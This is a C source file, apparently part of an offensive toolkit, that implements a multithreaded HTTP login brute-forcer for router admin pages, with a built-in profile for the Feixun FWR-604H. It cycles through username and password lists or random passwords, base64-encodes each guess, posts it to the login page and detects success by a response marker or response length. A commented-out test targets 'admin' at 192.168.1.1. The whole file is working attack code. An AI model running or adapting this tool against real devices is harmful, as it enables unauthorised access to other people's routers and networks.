#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <pthread.h>

#include "../main.h"
#include "guess.h"

// from ../core/debug.c
extern int DisplayDebug(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
extern int DisplayInfo(const char *fmt, ...);
extern int DisplayWarning(const char *fmtsring, ...);
extern int DisplayError(const char *fmt, ...);

// from ../core/str.c
extern int GetRandomPassword(char **rebuf, unsigned int seed, const int length);
extern int SplitURL(const char *url, pSplitURLOutput *output);
extern void FreeRandomPasswordBuff(char *password);
extern void FreeSplitURLBuff(pSplitURLOutput p);
extern void FreeProcessFileBuff(pStrHeader p);
extern int ProcessFile(const char *path, pStrHeader *output, int flag);

// from ../core/http.c
extern size_t HTTPPost(const char *url, const char *request, char **response, int debug_level);
extern void FreeHTTPPostBuff(char *p);

// from ../core/base64.c
extern size_t Base64Encode(char **b64message, const unsigned char *buffer, size_t length);
extern size_t Base64Decode(unsigned char **buffer, char *b64message);
extern void FreeBase64(char *b64message);

// value for check
char *REQUEST;
char *REQUEST_DATA;
char *SUCCESS_MODEL;

int CHECK = CheckModel;
char *RESPONSE;
int RESPONSE_LENGTH = 0;
int WATCH_LENGTH = 0;

static void FreeMatchModel(pMatchOutput p)
{
    if (p)
    {
        free(p);
    }
}

static int MatchModel(pMatchOutput *output, const char *input)
{
    // rude way
    if (strstr(input, "feixun_fwr_604h"))
    {
        (*output) = (pMatchOutput)malloc(sizeof(MatchOutput));
        if (!(*output))
        {
            DisplayError("MatchModel malloc failed");
            return -1;
        }
        (*output)->request = FEIXUN_FWR_604H_REQUEST;
        (*output)->request_data = FEIXUN_FWR_604H_REQUEST_DATA;
        (*output)->success_or_not = FEIXUN_FWR_604H_SUCCESS;
        (*output)->next = NULL;
    }
    else if (strstr(input, "not_sure"))
    {
        // defalut value for test
        MatchModel(output, MODEL_TYPE_DEFAULT);
    }
    else
    {
        DisplayError("Can not found that model: %s", input);
        return -1;
    }

    return 0;
}

static int CheckResponse(void)
{
    // if SUCCESS_MODEL in the respoonse, we get the right password

    if (CHECK == CheckModel)
    {
        if (strstr(RESPONSE, SUCCESS_MODEL))
        {
            DisplayInfo("Found the password");
            return 0;
        }
    }
    else if (CHECK == CheckLength)
    {
        if (WATCH_LENGTH == RESPONSE_LENGTH)
        {
            DisplayInfo("Found the password");
            return 0;
        }
    }

    return -1;
}

static int LocateElement(const pStrHeader p, pStrNode *element, const size_t loc)
{
    // locate the str linked list element
    if (loc < 0 || loc > p->length)
    {
        DisplayError("LocateElement loc illegal");
        return -1;
    }
    size_t count = 0;
    pStrNode t = p->next;
    while (count != loc)
    {
        t = t->next;
        ++count;
    }

    *element = t;
    return 0;
}

static int UListPList(pInput input, size_t u_start, size_t u_end, size_t p_start, size_t p_end)
{
    // username is a list and password is list too
    if (!(input->gau->u_header))
    {
        DisplayError("UListPList get u_header failed");
        return -1;
    }
    pStrNode us;
    LocateElement(input->gau->u_header, &us, u_start);
    pStrNode ue;
    LocateElement(input->gau->u_header, &ue, u_end);
    pStrNode ps;
    LocateElement(input->gau->p_header, &ps, p_start);
    pStrNode pe;
    LocateElement(input->gau->p_header, &pe, p_end);
    pStrNode p;
    char *b64message;
    char *response;
    char request[strlen(REQUEST) + SEND_DATA_SIZE + 1];
    char data[SEND_DATA_SIZE + 1];
    pSplitURLOutput sp;

    if (SplitURL(input->address, &sp) == -1)
    {
        DisplayError("SplitURL failed");
        return -1;
    }
    while (us != ue)
    {
        if (!(input->gau->p_header))
        {
            DisplayError("UListPList get p_header failed");
            return -1;
        }
        p = ps;
        while (ps != pe)
        {
            // base64
            if (!memset(request, 0, sizeof(request)))
            {
                DisplayError("UListPlist memset failed");
                return -1;
            }
            if (!memset(data, 0, sizeof(data)))
            {
                DisplayError("UListPlist memset failed");
                return -1;
            }
            if (Base64Encode(&b64message, (unsigned char *)p->str, strlen(p->str)) == -1)
            {
                DisplayError("Base64Encode failed");
                return -1;
            }

            // combined data now
            if (!sprintf(data, REQUEST_DATA, us->str, b64message))
            {
                DisplayError("UListPlist sprintf failed");
                return -1;
            }
            if (!sprintf(request, REQUEST, sp->host, input->address, strlen(data), data))
            {
                DisplayError("UListPlist sprintf failed");
                return -1;
            }

            // send now
            DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "try username: %s, password: %s", us->str, p->str);
            if (HTTPPost(input->address, request, &response, 0) == -1)
            {
                DisplayError("HTTPPost failed");
                return -1;
            }

            // for debug use
            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "%s", response);
            if (CHECK == CheckLength)
            {
                RESPONSE_LENGTH = strlen(response);
            }
            else if (CHECK == CheckModel)
            {
                RESPONSE = response;
            }
            // now check
            if (CheckResponse() == 0)
            {
                DisplayInfo("Username: %s - Password: %s", us->str, p->str);
                return 0;
            }
            FreeHTTPPostBuff(response);
            FreeBase64(b64message);
            p = p->next;
        }
        us = us->next;
    }
    FreeSplitURLBuff(sp);

    return 0;
}

static int UOnePRandom(pInput input)
{
    // just one username and use random password

    char *password;
    char *b64message;
    char request[strlen(REQUEST) + SEND_DATA_SIZE + 1];
    char data[SEND_DATA_SIZE + 1];
    char *response;
    int seed = input->seed;
    pSplitURLOutput sp;

    if (SplitURL(input->address, &sp) == -1)
    {
        DisplayError("SplitURL failed");
        return -1;
    }

    for (;;)
    {
        ++seed;
        if (seed > 1024)
        {
            seed = 0;
        }
        if (GetRandomPassword(&password, seed, input->random_password_length) == -1)
        {
            DisplayError("GetRandomPassword failed");
            return -1;
        }

        // base64
        if (Base64Encode(&b64message, (unsigned char *)password, strlen(password)) == -1)
        {
            DisplayError("Base64Encode failed");
            return -1;
        }

        // combined data now
        if (!sprintf(data, REQUEST_DATA, input->username, b64message))
        {
            DisplayError("UOnePRandom sprintf failed");
            return -1;
        }
        if (!sprintf(request, REQUEST, sp->host, input->address, strlen(data), data))
        {
            DisplayError("UOnePRandom sprintf failed");
            return -1;
        }

        // send now
        DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "try username: %s, password: %s", input->username, password);
        if (HTTPPost(input->address, request, &response, 0) == -1)
        {
            DisplayError("HTTPPost failed");
            return -1;
        }
        // for debug
        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "%s", response);
        if (CHECK == CheckLength)
        {
            RESPONSE_LENGTH = strlen(response);
        }
        else if (CHECK == CheckModel)
        {
            RESPONSE = response;
        }
        if (CheckResponse() == 0)
        {
            DisplayInfo("Username: %s - Password: %s", input->username, password);
            return 0;
        }

        FreeHTTPPostBuff(response);
        FreeRandomPasswordBuff(password);
        FreeBase64(b64message);
    }

    return 0;
}

static int UOnePList(pInput input, size_t p_start, size_t p_end)
{
    if (!(input->gau->p_header))
    {
        DisplayError("UOnePList get p_header failed");
        return -1;
    }

    pStrNode ps;
    LocateElement(input->gau->p_header, &ps, p_start);
    pStrNode pe;
    LocateElement(input->gau->p_header, &pe, p_end);
    char *b64message;
    char *response;
    char request[strlen(REQUEST) + SEND_DATA_SIZE + 1];
    char data[SEND_DATA_SIZE + 1];
    pSplitURLOutput sp;

    if (SplitURL(input->address, &sp) == -1)
    {
        DisplayError("SplitURL failed");
        return -1;
    }

    // only use the part of this list
    while (ps != pe)
    {
        // base64
        if (!memset(request, 0, sizeof(request)))
        {
            DisplayError("UOnePList memset failed");
            return -1;
        }
        if (!memset(data, 0, sizeof(data)))
        {
            DisplayError("UOnePList memset failed");
            return -1;
        }
        if (Base64Encode(&b64message, (unsigned char *)ps->str, strlen(ps->str)) == -1)
        {
            DisplayError("Base64Encode failed");
            return -1;
        }

        // combined data now
        if (!sprintf(data, REQUEST_DATA, input->username, b64message))
        {
            DisplayError("UOnePList sprintf failed");
            return -1;
        }
        if (!sprintf(request, REQUEST, sp->host, input->address, strlen(data), data))
        {
            DisplayError("UOnePList sprintf failed");
            return -1;
        }

        // send now
        DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "try username: %s, password: %s", input->username, ps->str);
        if (HTTPPost(input->address, request, &response, 0) == -1)
        {
            DisplayError("HTTPPost failed");
            return -1;
        }

        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "%s", response);
        if (CHECK == CheckLength)
        {
            RESPONSE_LENGTH = strlen(response);
        }
        else if (CHECK == CheckModel)
        {
            RESPONSE = response;
        }
        if (CheckResponse() == 0)
        {
            DisplayInfo("Username: %s - Password: %s", input->username, ps->str);
            return 0;
        }
        FreeHTTPPostBuff(response);
        FreeBase64(b64message);
        ps = ps->next;
    }

    return 0;
}

static int UTestPTest(pInput input, int *length)
{
    char *b64message;
    char *response;
    char request[strlen(REQUEST) + SEND_DATA_SIZE + 1];
    char data[SEND_DATA_SIZE + 1];
    char *test_password = "this_world_only_one_password_is_this";
    pSplitURLOutput sp;

    if (SplitURL(input->address, &sp) == -1)
    {
        DisplayError("UTestPTest SplitURL failed");
        return -1;
    }

    // base64
    if (!memset(request, 0, sizeof(request)))
    {
        DisplayError("UTestPTest memset failed");
        return -1;
    }
    if (!memset(data, 0, sizeof(data)))
    {
        DisplayError("UTestPTest memset failed");
        return -1;
    }
    if (Base64Encode(&b64message, (unsigned char *)test_password, strlen(test_password)) == -1)
    {
        DisplayError("Base64Encode failed");
        return -1;
    }

    // combined data now
    if (!sprintf(data, REQUEST_DATA, input->username, b64message))
    {
        DisplayError("UTestPTest sprintf failed");
        return -1;
    }
    if (!sprintf(request, REQUEST, sp->host, input->address, strlen(data), data))
    {
        DisplayError("UTestPTest sprintf failed");
        return -1;
    }

    // send now
    DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "try username: %s, password: %s", input->username, test_password);
    if (HTTPPost(input->address, request, &response, 0) == -1)
    {
        DisplayError("HTTPPost failed");
        return -1;
    }

    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "%s", response);
    (*length) = (int)strlen(response);
    FreeHTTPPostBuff(response);
    FreeBase64(b64message);

    return 0;
}

int GuessAttack(pInput input)
{
    // start attack

    pMatchOutput mt;
    if (MatchModel(&mt, input->model_type) == -1)
    {
        DisplayError("MatchModel failed");
        return -1;
    }
    REQUEST = mt->request;
    REQUEST_DATA = mt->request_data;
    SUCCESS_MODEL = mt->success_or_not;

    DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "serial_num: %d", input->serial_num);
    if (input->guess_attack_type == GUESS_LENGTH)
    {
        CHECK = CheckLength;
        WATCH_LENGTH = input->watch_length;
    }
    else
    {
        CHECK = CheckModel;
    }

    if (input->guess_attack_type == GUESS_GET_RESPONSE_LENGTH)
    {
        int length;
        if (UTestPTest(input, &length) != -1)
        {
            return length;
        }
        else
            return -1;
    }
    else if (input->guess_attack_type == GUESS_U1PL)
    {
        size_t p_cut = (input->gau->p_header->length) / (((size_t)input->max_process) * ((size_t)input->max_thread));
        size_t p_start = (size_t)input->serial_num * p_cut;
        size_t p_end = ((size_t)input->serial_num + 1) * p_cut;
        if (UOnePList(input, p_start, p_end) == -1)
        {
            DisplayError("GuessAttack UOnePList failed");
            return -1;
        }
    }
    else if (input->guess_attack_type == GUESS_U1PR)
    {
        if (UOnePRandom(input) == -1)
        {
            DisplayError("GuessAttack UOnePRondom failed");
            return -1;
        }
    }
    else if (input->guess_attack_type == GUESS_ULPL)
    {
        size_t u_cut = (input->gau->u_header->length) / (((size_t)input->max_process) * ((size_t)input->max_thread));
        size_t u_start = (size_t)input->serial_num * u_cut;
        size_t u_end = ((size_t)input->serial_num + 1) * u_cut;

        size_t p_cut = (input->gau->p_header->length) / (((size_t)input->max_process) * ((size_t)input->max_thread));
        size_t p_start = (size_t)input->serial_num * p_cut;
        size_t p_end = ((size_t)input->serial_num + 1) * p_cut;
        if (UListPList(input, u_start, u_end, p_start, p_end) == -1)
        {
            DisplayError("GuessAttack UListPList failed");
            return -1;
        }
    }
    else
    {
        DisplayError("Unknow guess attack type");
        return -1;
    }
    FreeMatchModel(mt);
    pthread_exit(NULL);
    return 0;
}

/*
int main(void)
{

    pInput t_input = (pInput)malloc(sizeof(Input));
    t_input->max_process = 1;
    t_input->max_thread = 1;
    t_input->serial_num = 0;
    memset(t_input->username, 0, sizeof(t_input->username));
    strncpy(t_input->username, "admin", strlen("admin"));
    t_input->debug_level = 1;
    //strncpy(t_input->username_path, "username1.txt", strlen("username1.txt"));
    //memset(t_input->password_path, 0, sizeof(t_input->password_path));
    //strncpy(t_input->password_path, "password.txt", strlen("password.txt"));
    t_input->seed = 10;
    t_input->random_password_length = 8;
    strcpy(t_input->model_type, "feixun_fwr_604h");
    strcpy(t_input->address, "http://192.168.1.1:80/login.asp");

    GuessAttack(t_input);
    return 0;
}
*/